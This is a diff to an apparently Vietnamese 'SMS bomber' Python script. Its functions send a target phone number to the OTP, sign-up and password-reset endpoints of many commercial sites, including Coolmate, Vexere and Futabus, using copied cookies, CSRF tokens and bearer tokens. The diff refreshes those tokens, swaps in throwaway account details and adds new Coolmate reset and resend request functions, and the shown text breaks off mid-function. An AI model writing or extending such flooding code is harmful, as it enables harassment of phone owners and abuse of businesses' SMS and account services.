@@ -76,7 +76,7 @@ def tv360():
         print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
+    
 def beautybox():
     headers = {
         'accept': 'application/json, text/plain, */*',
@@ -221,37 +221,6 @@ def futabus():
         print("FUTABUS | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("FUTABUS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-
-# def domino():
-#     headers = {
-#         'accept': 'application/json, text/plain, */*',
-#         'accept-language': 'vi',
-#         'content-type': 'application/json',
-#         'dmn': 'DTPGDW',
-#         'origin': 'https://dominos.vn',
-#         'priority': 'u=1, i',
-#         'referer': 'https://dominos.vn/?gad_source=1',
-#         'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-#         'sec-ch-ua-mobile': '?0',
-#         'sec-ch-ua-platform': '"Windows"',
-#         'sec-fetch-dest': 'empty',
-#         'sec-fetch-mode': 'cors',
-#         'sec-fetch-site': 'same-origin',
-#         'secret': 'bPG0upAJLk0gz/2W1baS2Q==',
-#         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-#     }
-
-#     json_data = {
-#         'phone_number': sdt,
-#         'email': 'licehe9526@newcupon.com',
-#         'type': 0,
-#         'is_register': True,
-#     }
-
-#     response = requests.post('https://dominos.vn/api/v1/users/send-otp', headers=headers, json=json_data)
-#     print(response.text)
-
-# DOMINO LỖI 404:Bad Requests
 
 def galaxyplay():
     headers = {
@@ -1269,38 +1238,6 @@ def fmstyle():
     except requests.exceptions.RequestException:
         print("FMSTYLE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
-def circa():
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'vi-VN',
-        'authorization': '',
-        'content-type': 'application/json',
-        'grpc-timeout': '30S',
-        'origin': 'https://circa.vn',
-        'priority': 'u=1, i',
-        'referer': 'https://circa.vn/',
-        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-    }
-
-    json_data = {
-        'phone': {
-            'country_code': '84',  # Giả sử mã quốc gia là '84'
-            'phone_number': sdt[1:],  # Lấy phần còn lại của số điện thoại
-        },
-    }
-
-    try:
-        response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
-        response.raise_for_status()  # Raise an exception for HTTP errors
-        print("CIRCA | TRẠNG THÁI : THÀNH CÔNG")
-    except requests.exceptions.RequestException:
-        print("CIRCA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
 def acfc():
     cookies = {
@@ -1833,7 +1770,7 @@ def vexere():
     headers = {
         'accept': 'application/json, text/plain, */*',
         'accept-language': 'vi-VN',
-        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIxODAxOTQ0fQ.f5G-W3dbA-rcY3JAF1WShz-6-Nl32TNXKFpFimceF1g',
+        'authorization': 'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXAiOjIsInVzciI6ImZlIiwiY2lkIjoiYTRlYWM1MDAtMzYyNC0xMWU1LWFjOWUtMDkxMjRjNjAxMDEzIiwiZXhwIjoxNzIyMTg2Mzg1fQ.zG6tG8-JmMkj08kJjMeSUOrKwUEjvsKwwgyPWJQ-IkM',
         'content-type': 'application/json',
         'origin': 'https://vexere.com',
         'priority': 'u=1, i',
@@ -2569,18 +2506,18 @@ def coolmate():
         'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
         'cart_quantity': '0',
         'active-voucher1': 'true',
-        'affiliate_content': '%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D',
-        'g_state': '{"i_p":1721731756061,"i_l":2}',
-        'redirect_url': 'eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D',
-        'XSRF-TOKEN': 'eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D',
-        'laravel_session': 'eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
+        'g_state': '{"i_p":1722403917652,"i_l":3}',
+        'affiliate_content': '%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D',
+        'redirect_url': 'eyJpdiI6IlBUcVZ3ZDBmTzIxeHBUQld5RCtzaFE9PSIsInZhbHVlIjoiakJ3aEpvMzYzNzl6WG9UMWFyT1Z5ZjlVMzZsNDdkdWFOS1VPaGU2U2JFK2Z0MVRDWGNFWDYxdXlcL3BrVlVLanMiLCJtYWMiOiIxYzVjNjI5NTQ5OGY3MzFkMzQ3M2E4NGJjYjI2NzMyYmJlMTVlNDYxZWM2ZDNkYTE5ZDQxN2U3MDAzZGZiNzhkIn0%3D',
+        'XSRF-TOKEN': 'eyJpdiI6Imk3dzEwY0JLaFwvZFJhR0xmb09cL2xqQT09IiwidmFsdWUiOiJqS0VKNzRcL3ZReGNCSjJJN0pkQmhOWllTTnBzNWFkVHVpUlo4NlQ3QUxubU95TEcyS05nRG9VckFRWnJaSW1MayIsIm1hYyI6ImY0Mzc5OTRkNjY1ODNmNDJlNzZlYmM0NDg1MDUwNmI0NWYzMWRlMTA5YWNhZTQ5ZjM2YjYxYjQ1NWQ2OGJjZGYifQ%3D%3D',
+        'laravel_session': 'eyJpdiI6IkQ2YkJlVlROQnh1RENBakNnY1JYUUE9PSIsInZhbHVlIjoiUXd2eGRKcm1GSWVZRGhKVVBJbnIyZ0hiQmJxb3VvQjVPcWpMc2pnalczc1lnY2taUEJkRFp3SngzeE5aU2JNRSIsIm1hYyI6ImZiMjg3OWIwMDNhYjkwZmQ5NTY3Mjg1OGVjYjBlYmE5MGFjNzE5NGM1OGMzYjhmNjA0YzhhNDcyNzc0ODZiZTUifQ%3D%3D',
     }
 
     headers = {
         'accept': '*/*',
         'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
         'content-type': 'application/json',
-        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; affiliate_content=%7B%22time_stamp%22%3A1721645343%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22pmax%22%2C%22utm_campaign%22%3A%22VN_GG_PMAX_4SEASON%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fao-thun-nam%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.165%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2219538181565--%22%2C%22utm_content%22%3Anull%2C%22gclid%22%3A%22CjwKCAjwhvi0BhA4EiwAX25ujy3lXW-SzLrWClAwv-fcDMt1jRqtd66LlrUfZ891qpNlFAjPd_jL2xoCrPEQAvD_BwE%22%7D; g_state={"i_p":1721731756061,"i_l":2}; redirect_url=eyJpdiI6IjVIRCtoazd6dWd4aXlGSk0rMzR1WlE9PSIsInZhbHVlIjoiYmNvdXZSWXZJV3NRUUs0Yml1Vk80MXR4b3Z0UndvZTd0WHpZM2MrQlNOY0plWDdaMjhmMFpZeUxRVlRlQ29DOSIsIm1hYyI6IjQxNTI2Yjg0NzZlOTQ0ZWQ0MTYwODMzYjU0NzhmODk2ODE5Y2YxZjAzNDg1MDI1ZjhjYTdjMmY5NWFkNjZjN2IifQ%3D%3D; XSRF-TOKEN=eyJpdiI6IldGZ293cmxOeDR3TGpnaGJvWFdGM2c9PSIsInZhbHVlIjoiOWZPT1d1bWNiWGtzbUh1WEd2K3RBRm5kUit3bFY2bnFNSWpTWHpyZGRQWmtnekJLY2pGQ3d6Nzh1Njd1TmRjNCIsIm1hYyI6IjhkYTIxYmIwOWRjY2ZiMDQwNzEwY2Q3MGYyNGFiNWM0NzY4MzRjMGE0MGVhZTY0MmU1NmQ5YjJkOGY5MDZkOGQifQ%3D%3D; laravel_session=eyJpdiI6ImlZazZDeUI3dldLS0krUWdXcnRhVmc9PSIsInZhbHVlIjoiVUhNWWZuRjgxNXFuY2ZYR0NTRG41RXZ4VEJ3YVk5ZkRMbmZmdkpyYlpFaHBGbndcL0lWcE5VNFVGZFFxellpenciLCJtYWMiOiJiYTE1YTIzMjhmMzVmYzc5MzMxYjQyYzM2MTZiYjc1Mjg4MTE1M2IzMjU2ZTI2NDNiNjhmNGNkY2ViNmU1YjMyIn0%3D',
+        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1722403917652,"i_l":3}; affiliate_content=%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D; redirect_url=eyJpdiI6IlBUcVZ3ZDBmTzIxeHBUQld5RCtzaFE9PSIsInZhbHVlIjoiakJ3aEpvMzYzNzl6WG9UMWFyT1Z5ZjlVMzZsNDdkdWFOS1VPaGU2U2JFK2Z0MVRDWGNFWDYxdXlcL3BrVlVLanMiLCJtYWMiOiIxYzVjNjI5NTQ5OGY3MzFkMzQ3M2E4NGJjYjI2NzMyYmJlMTVlNDYxZWM2ZDNkYTE5ZDQxN2U3MDAzZGZiNzhkIn0%3D; XSRF-TOKEN=eyJpdiI6Imk3dzEwY0JLaFwvZFJhR0xmb09cL2xqQT09IiwidmFsdWUiOiJqS0VKNzRcL3ZReGNCSjJJN0pkQmhOWllTTnBzNWFkVHVpUlo4NlQ3QUxubU95TEcyS05nRG9VckFRWnJaSW1MayIsIm1hYyI6ImY0Mzc5OTRkNjY1ODNmNDJlNzZlYmM0NDg1MDUwNmI0NWYzMWRlMTA5YWNhZTQ5ZjM2YjYxYjQ1NWQ2OGJjZGYifQ%3D%3D; laravel_session=eyJpdiI6IkQ2YkJlVlROQnh1RENBakNnY1JYUUE9PSIsInZhbHVlIjoiUXd2eGRKcm1GSWVZRGhKVVBJbnIyZ0hiQmJxb3VvQjVPcWpMc2pnalczc1lnY2taUEJkRFp3SngzeE5aU2JNRSIsIm1hYyI6ImZiMjg3OWIwMDNhYjkwZmQ5NTY3Mjg1OGVjYjBlYmE5MGFjNzE5NGM1OGMzYjhmNjA0YzhhNDcyNzc0ODZiZTUifQ%3D%3D',
         'origin': 'https://www.coolmate.me',
         'priority': 'u=1, i',
         'referer': 'https://www.coolmate.me/account/register',
@@ -2591,14 +2528,14 @@ def coolmate():
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'same-origin',
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
-        'x-csrf-token': 'GzCw2nVV8RIFiuB3x47ySHEel1qgAVQVytf79QrI',
+        'x-csrf-token': 'q5YgFB6c3H2kmd2OH55Y5LRduCE61mM6mW5WKxpX',
     }
 
     json_data = {
-        'fullname': 'tran quoc huuh',
-        'email': 'quadeptrai@gmail.com',
+        'fullname': 'tran qvan',
+        'email': 'lamgidoooa@gmail.com',
         'phone': sdt,
-        'password': '123123123',
+        'password': '123123aA@',
         'ajax': True,
     }
 
@@ -2608,7 +2545,7 @@ def coolmate():
         print("COOLMATE | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
         print("COOLMATE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
-        
+
 def mioto():
     cookies = {
         '_vid': 'Eiw8L9Ir5m56SIn0',
@@ -3647,6 +3584,93 @@ def pasgo():
     except requests.exceptions.RequestException:
         print("PASGO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
 
+def coolmatereset():
+    cookies = {
+        'device_token': '597f946e29e835d88f56392f40ea75c3',
+        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
+        'cart_quantity': '0',
+        'active-voucher1': 'true',
+        'g_state': '{"i_p":1722403917652,"i_l":3}',
+        'affiliate_content': '%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D',
+        'XSRF-TOKEN': 'eyJpdiI6IjArbjZQQnpYT2V1YSt0RHFCbTg1SUE9PSIsInZhbHVlIjoiUjhPSzBZM1Z2dGt0VzZMYVJPK0RNYXlDMUQ5b1FtNVd0SHJpMHBZZEU3TDBEem5mc2I1TEZZT05ITWgrQ001cyIsIm1hYyI6ImY4OWQwZjAwODM1Mjg3MGNhZTNiNWYxNmExYzE0M2Y4NDJjYjNkNmJkMzNiNTRlNmMwYjZlYjA2ZTg2YzgwMWUifQ%3D%3D',
+        'laravel_session': 'eyJpdiI6InhxRjBnSENmS2VjSWphdlFqdGIwTGc9PSIsInZhbHVlIjoib01xTkl0bkVMRzJFdk1ocWx6RWRzTjhOZExNc01aVEx3eXZzQ3FvMTh6VEEweHNaRHNzS1RxTzJMazBrUnk0NyIsIm1hYyI6IjljNzI0Mjk1NWM3MTliOGYwOTQwYzJlZDFkNWE5NGY3NDlmNDliY2NjYzMzMzQ1MWQ1YjA1M2EyZTVmYWQyYTYifQ%3D%3D',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1722403917652,"i_l":3}; affiliate_content=%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D; XSRF-TOKEN=eyJpdiI6IjArbjZQQnpYT2V1YSt0RHFCbTg1SUE9PSIsInZhbHVlIjoiUjhPSzBZM1Z2dGt0VzZMYVJPK0RNYXlDMUQ5b1FtNVd0SHJpMHBZZEU3TDBEem5mc2I1TEZZT05ITWgrQ001cyIsIm1hYyI6ImY4OWQwZjAwODM1Mjg3MGNhZTNiNWYxNmExYzE0M2Y4NDJjYjNkNmJkMzNiNTRlNmMwYjZlYjA2ZTg2YzgwMWUifQ%3D%3D; laravel_session=eyJpdiI6InhxRjBnSENmS2VjSWphdlFqdGIwTGc9PSIsInZhbHVlIjoib01xTkl0bkVMRzJFdk1ocWx6RWRzTjhOZExNc01aVEx3eXZzQ3FvMTh6VEEweHNaRHNzS1RxTzJMazBrUnk0NyIsIm1hYyI6IjljNzI0Mjk1NWM3MTliOGYwOTQwYzJlZDFkNWE5NGY3NDlmNDliY2NjYzMzMzQ1MWQ1YjA1M2EyZTVmYWQyYTYifQ%3D%3D',
+        'origin': 'https://www.coolmate.me',
+        'priority': 'u=1, i',
+        'referer': 'https://www.coolmate.me/account/forgot',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-csrf-token': 'q5YgFB6c3H2kmd2OH55Y5LRduCE61mM6mW5WKxpX',
+    }
+
+    json_data = {
+        'address': sdt,
+        'type': 'phone',
+        'prev': 'https://www.coolmate.me/account/login?itm_source=navbar',
+        'ajax': True,
+    }
+
+    try:
+        response = requests.post('https://www.coolmate.me/account/forgotPassword', cookies=cookies, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("COOLMATERESET | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("COOLMATERESET | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
+
+def coolmateresend():
+    cookies = {
+        'device_token': '597f946e29e835d88f56392f40ea75c3',
+        'box_token': '9dbb29f1bd9e93ef4a5f8468ff0b5618',
+        'cart_quantity': '0',
+        'active-voucher1': 'true',
+        'g_state': '{"i_p":1722403917652,"i_l":3}',
+        'affiliate_content': '%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D',
+        'XSRF-TOKEN': 'eyJpdiI6Ikw3Q0hENlYzTEk0Mks1clwvN1U1eUVRPT0iLCJ2YWx1ZSI6InQ2bFROVThKeHIzYUZNdklQbDRWdXBcL09vZU5CVHdHdWkrS1V1eW9FR1Z2ajZvRkdKVjY1N1hOcFwvOEpxWXlZKyIsIm1hYyI6IjdkNDc0M2JhMWZjNThjZTViODdiMThhMDg0NWJmYjc3NTAwZjY2MzY2NzhkOTkxNTVmZGEwZmU5ZDExNzUyMDAifQ%3D%3D',
+        'laravel_session': 'eyJpdiI6IkxjclpJYTZyYmhmVHpPeUhsSk01b0E9PSIsInZhbHVlIjoiMW8wc0pHMnR0ZlJXcVBLbmk1UEpYNVA2ZDRhaU5IRkh5MFFYY0lZUVRadVZKMW9YMytIM0tNK3dFamdwYklLSyIsIm1hYyI6IjZlZmFmZTM2ZWQ0Njk5MDBjNDRmZWZkOThlYjdjNDcxNjk2MGY3MTliNDQ2YmMyYjQ5Y2EzOWM0Njg3MTE5YzYifQ%3D%3D',
+        'redirect_url': 'eyJpdiI6IlBUcVZ3ZDBmTzIxeHBUQld5RCtzaFE9PSIsInZhbHVlIjoiakJ3aEpvMzYzNzl6WG9UMWFyT1Z5ZjlVMzZsNDdkdWFOS1VPaGU2U2JFK2Z0MVRDWGNFWDYxdXlcL3BrVlVLanMiLCJtYWMiOiIxYzVjNjI5NTQ5OGY3MzFkMzQ3M2E4NGJjYjI2NzMyYmJlMTVlNDYxZWM2ZDNkYTE5ZDQxN2U3MDAzZGZiNzhkIn0%3D',
+    }
+
+    headers = {
+        'accept': '*/*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        # 'cookie': 'device_token=597f946e29e835d88f56392f40ea75c3; box_token=9dbb29f1bd9e93ef4a5f8468ff0b5618; cart_quantity=0; active-voucher1=true; g_state={"i_p":1722403917652,"i_l":3}; affiliate_content=%7B%22time_stamp%22%3A1722183210%2C%22source%22%3A%22ggads%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22search%22%2C%22utm_campaign%22%3A%22VN_GG_SEARCH_BRANDKEY%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%2C%22remote_addr%22%3A%22103.161.22.162%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%5C%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%5C%2F126.0.0.0%20Safari%5C%2F537.36%20OPR%5C%2F112.0.0.0%22%2C%22utm_term%22%3A%2221084599217-163380422121-coolmate%22%2C%22utm_content%22%3A%22693188749431%22%2C%22gclid%22%3A%22CjwKCAjw2Je1BhAgEiwAp3KY739mKtecc9dlS5fi39n6ZFmGvB1cwdDu9FjCpG7KGqjDQbjsMG-EyBoCZ8EQAvD_BwE%22%7D; XSRF-TOKEN=eyJpdiI6Ikw3Q0hENlYzTEk0Mks1clwvN1U1eUVRPT0iLCJ2YWx1ZSI6InQ2bFROVThKeHIzYUZNdklQbDRWdXBcL09vZU5CVHdHdWkrS1V1eW9FR1Z2ajZvRkdKVjY1N1hOcFwvOEpxWXlZKyIsIm1hYyI6IjdkNDc0M2JhMWZjNThjZTViODdiMThhMDg0NWJmYjc3NTAwZjY2MzY2NzhkOTkxNTVmZGEwZmU5ZDExNzUyMDAifQ%3D%3D; laravel_session=eyJpdiI6IkxjclpJYTZyYmhmVHpPeUhsSk01b0E9PSIsInZhbHVlIjoiMW8wc0pHMnR0ZlJXcVBLbmk1UEpYNVA2ZDRhaU5IRkh5MFFYY0lZUVRadVZKMW9YMytIM0tNK3dFamdwYklLSyIsIm1hYyI6IjZlZmFmZTM2ZWQ0Njk5MDBjNDRmZWZkOThlYjdjNDcxNjk2MGY3MTliNDQ2YmMyYjQ5Y2EzOWM0Njg3MTE5YzYifQ%3D%3D; redirect_url=eyJpdiI6IlBUcVZ3ZDBmTzIxeHBUQld5RCtzaFE9PSIsInZhbHVlIjoiakJ3aEpvMzYzNzl6WG9UMWFyT1Z5ZjlVMzZsNDdkdWFOS1VPaGU2U2JFK2Z0MVRDWGNFWDYxdXlcL3BrVlVLanMiLCJtYWMiOiIxYzVjNjI5NTQ5OGY3MzFkMzQ3M2E4NGJjYjI2NzMyYmJlMTVlNDYxZWM2ZDNkYTE5ZDQxN2U3MDAzZGZiNzhkIn0%3D',
+        'origin': 'https://www.coolmate.me',
+        'priority': 'u=1, i',
